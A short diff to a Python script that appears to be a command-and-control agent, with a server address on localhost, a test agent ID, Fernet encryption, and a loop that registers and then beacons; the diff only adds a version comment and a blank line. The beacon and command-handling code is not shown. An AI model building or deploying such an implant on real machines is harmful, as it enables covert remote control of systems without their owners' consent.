@@ -1,6 +1,6 @@
 import requests, time, subprocess, socket, random, uuid
 from cryptography.fernet import Fernet
-
+#encrypted version EV1.1
 SERVER_URL = "http://127.0.0.1:5000"
 AGENT_ID = f"test_agent_01"#"agent_{uuid.getnode()}"
 HOSTNAME = socket.gethostname()
@@ -44,4 +44,5 @@ def beacon():
 
 if __name__ == "__main__":
     while not register(): time.sleep(5)
+
     beacon()
